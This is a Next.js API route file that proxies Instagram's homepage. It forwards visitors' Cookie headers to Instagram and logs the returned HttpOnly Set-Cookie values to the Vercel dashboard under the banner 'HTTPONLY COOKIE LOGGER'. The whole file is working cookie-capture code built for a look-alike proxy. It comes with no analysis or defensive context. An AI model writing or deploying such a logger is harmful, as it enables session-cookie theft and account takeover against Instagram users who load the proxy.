// pages/api/proxy.js

export default async function handler(req, res) {
  try {
    // 1. Fetch Instagram from the server side
    const response = await fetch('https://www.instagram.com/', {
      headers: {
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Cookie': req.headers['cookie'] || '',
      },
    });

    // 2. Extract HttpOnly Cookies from the response headers
    const cookies = response.headers.getSetCookie().join('; ');

    // 3. Log to Vercel Dashboard
    console.log('======================');
    console.log('🍪 HTTPONLY COOKIE LOGGER');
    console.log('📅 Time:', new Date().toISOString());
    console.log('🍪 HttpOnly Cookies:', cookies);
    console.log('======================');

    // 4. Stream the response body to the user
    // Convert the ReadableStream to a Node.js Readable stream
    const reader = response.body.getReader();
    
    // Set headers
    res.setHeader('Content-Type', response.headers.get('Content-Type') || 'text/html');
    res.setHeader('Set-Cookie', cookies);
    res.statusCode = response.status;

    // Helper function to read chunks
    const streamToNode = async (reader, res) => {
      while (true) {
        const { done, value } = await reader.read();
        if (done) {
          res.end();
          break;
        }
        res.write(value);
      }
    };

    // Start streaming
    streamToNode(reader, res).catch(err => {
      console.error('Stream Error:', err);
      res.status(500).end();
    });

  } catch (error) {
    console.error('Proxy Error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
}
